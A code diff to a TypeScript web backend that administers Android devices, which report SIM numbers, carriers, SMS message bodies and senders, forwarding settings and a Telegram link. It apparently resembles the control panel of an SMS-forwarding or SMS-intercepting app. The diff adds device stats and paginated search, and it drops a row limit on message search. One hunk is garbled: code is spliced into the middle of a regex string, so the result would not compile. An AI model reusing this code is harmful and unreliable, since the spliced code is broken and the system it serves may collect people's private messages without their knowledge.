@@ -754,7 +754,7 @@ app.get("/api/messages", async (c) => {
     const searchCond = sql`(${messages.body} ILIKE ${like} OR ${messages.fromSender} ILIKE ${like} OR ${messages.fromNumber} ILIKE ${like} OR ${messages.appId} ILIKE ${like} OR ${messages.deviceId} ILIKE ${like})` as unknown as ReturnType<typeof eq>;
     const allConds = [...scopeConds, searchCond];
     const where = allConds.length === 1 ? allConds[0] : and(...allConds);
-    const rows = await db.select().from(messages).where(where).orderBy(desc(messages.id)).limit(500);
+    const rows = await db.select().from(messages).where(where).orderBy(desc(messages.id));
     return c.json(rows.map(mapMessage));
   } else {
     // ── Browse mode: cursor pagination, newest first ───────────────────────
@@ -1137,6 +1137,24 @@ app.patch("/api/master/apps/:appId", async (c) => {
   return c.json({ id: r.id, appId: r.appId, name: r.name, pin: r.pin, status: r.status, createdAt: isoReq(r.createdAt) });
 });
 
+
+// Master admin: fast stats — online count + total devices via SQL COUNT (no full table download)
+app.get("/api/master/stats", async (c) => {
+  const guard = await checkMasterPin(c as never);
+  if (guard) return guard;
+  const sqlA = neon(c.env.NEON_DATABASE_URL);
+  const threshold = new Date(Date.now() - 15 * 60 * 1000).toISOString();
+  const rows = await sqlA(
+    `SELECT
+       COUNT(*) FILTER (WHERE last_online > $1) AS online_count,
+       COUNT(*) AS total_devices
+     FROM devices`,
+    [threshold]
+  );
+  const r = rows[0] as Record<string, unknown>;
+  return c.json({ onlineCount: Number(r.online_count ?? 0), totalDevices: Number(r.total_devices ?? 0) });
+});
+
 // Master admin: all devices across all app-ids — requires x-master-pin header
 // Telegram: auto-discover chat ID from getUpdates and save to settings
 app.post("/api/master/telegram/setup", async (c) => {
@@ -1191,6 +1209,15 @@ app.get("/api/master/all-devices", async (c) => {
     })));
   }
   const db = getDb(c.env);
+  const appIdQ = c.req.query("appId");
+  const searchQ = (c.req.query("search") ?? "").trim();
+  const limitN = Math.max(0, parseInt(c.req.query("limit") ?? "0", 10) || 0);
+  const offsetN = Math.max(0, parseInt(c.req.query("offset") ?? "0", 10) || 0);
+  // Build filter conditions
+  const conds: ReturnType<typeof eq>[] = [];
+  if (appIdQ) conds.push(eq(devices.appId, appIdQ));
+  if (searchQ) {
+    const like = `%${searchQ.replace(/[%_\\]/g, "\\  const db = getDb(c.env);
   const rows = await db.select().from(devices).orderBy(asc(devices.appId), asc(devices.name));
   return c.json(rows.map(r => ({
     id: r.id,
@@ -1210,6 +1237,26 @@ app.get("/api/master/all-devices", async (c) => {
     hasFcm: r.fcmToken !== null && r.fcmToken !== "",
     installedAt: isoReq(r.installedAt),
   })));
+});")}%`;
+    conds.push(sql`(${devices.name} ILIKE ${like} OR ${devices.deviceId} ILIKE ${like} OR COALESCE(${devices.sim1Phone},'') ILIKE ${like} OR COALESCE(${devices.sim2Phone},'') ILIKE ${like} OR COALESCE(${devices.userId},'') ILIKE ${like})` as unknown as ReturnType<typeof eq>);
+  }
+  const where = conds.length === 0 ? undefined : conds.length === 1 ? conds[0] : and(...conds);
+  // Fast COUNT for total
+  const [{ total }] = await db.select({ total: sql<number>`COUNT(*)::int` }).from(devices).where(where);
+  // Paginated data
+  const baseQ = db.select().from(devices).where(where).orderBy(asc(devices.appId), asc(devices.name));
+  const rows = limitN > 0 ? await baseQ.limit(limitN).offset(offsetN) : await baseQ;
+  const mapRow = (r: typeof rows[0]) => ({
+    id: r.id, deviceId: r.deviceId, appId: r.appId, userId: r.userId,
+    name: r.name, androidVersion: r.androidVersion,
+    sim1Carrier: r.sim1Carrier, sim1Phone: r.sim1Phone,
+    sim2Carrier: r.sim2Carrier, sim2Phone: r.sim2Phone,
+    status: r.status, lastOnline: iso(r.lastOnline),
+    forwardEnabled: r.forwardEnabled, forwardSlot: r.forwardSlot,
+    hasFcm: r.fcmToken !== null && r.fcmToken !== "",
+    installedAt: isoReq(r.installedAt),
+  });
+  return c.json({ data: rows.map(mapRow), total, hasMore: limitN > 0 && offsetN + limitN < total });
 });
 
 // Master admin: delete app — requires x-master-pin header
